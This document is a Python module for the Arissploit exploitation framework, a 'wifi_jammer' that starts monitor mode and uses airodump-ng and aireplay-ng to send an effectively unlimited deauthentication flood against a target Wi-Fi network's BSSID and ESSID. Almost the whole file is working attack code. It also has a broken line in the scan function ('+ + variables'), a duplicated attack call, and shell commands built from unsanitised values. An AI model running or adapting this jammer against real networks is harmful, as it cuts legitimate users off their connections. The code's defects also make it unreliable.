from core.arissploit import *
import subprocess
import os
from core import colors
from core import getpath

conf = {
	"name": "wifi_jammer",
	"version": "1.0",
	"shortdesc": "Jam wifi.",
	"author": "Entynetproject.",
	"initdate": "24.2.2016",
	"lastmod": "29.12.2016",
	"apisupport": False,
	"needroot": 1,
	"dependencies": ["xterm", "aircrack-ng"]
}

# List of the variables
variables = OrderedDict((
	('interface', ['wlan0', 'Wireless interface name.']),
	('bssid', ['none', 'Target BSSID address.']),
	('essid', ['none', 'Target ESSID name.']),
	('mon', ['mon0', 'Monitor.']),
	('channel', ['11', 'Target channel number.']),
))

# Additional help notes
help_notes = colors.red+"This module will not work without root permission!\n This module will not work without xterm, aircrack-ng!"+colors.end

# Used with custom commands (remove this if are not using custom commands)
customcommands = {
	'scan': 'Scan for target.',
	'stop': 'Terminate process.'
}

# Simple changelog
changelog = "Version 1.0:\n\trelease"


def run():
	printInfo("Attack has been started on: " + variables['essid'][0])
	printInfo("Use command 'stop' to end attack." + colors.end)
	xterm_3 = "xterm -e "+ "airodump-ng" +" -c " + variables['channel'][0] + " --bssid " + variables['bssid'][0] + " " + variables['mon'][0] + " &"
	os.system(xterm_3)
	xterm_4 = "xterm -e "+"aireplay-ng"+" --deauth 9999999999999 -o 1 -a " + variables['bssid'][0] + " -e " + variables['essid'][0] + " " + variables['mon'][0] + " &"
	os.system(xterm_4)
	os.system(xterm_4)
	printInfo("Attack started...")

def stop(args):
	subprocess.Popen("killall xterm", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	subprocess.Popen("killall aireplay", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	xterm_5 =  "airmon-ng"+" stop " + variables['interface'][0]
	os.system(xterm_5)
	printSuccess("Process terminated!")

def scan(args):
	xterm_1 = "airmon-ng"+" start " + variables['interface'][0]
	xterm_2 = "xterm -e "+"airmon-ng " + + variables['mon'][0] + " &"
	subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	os.system(xterm_2)
	printSuccess("Scan started...")
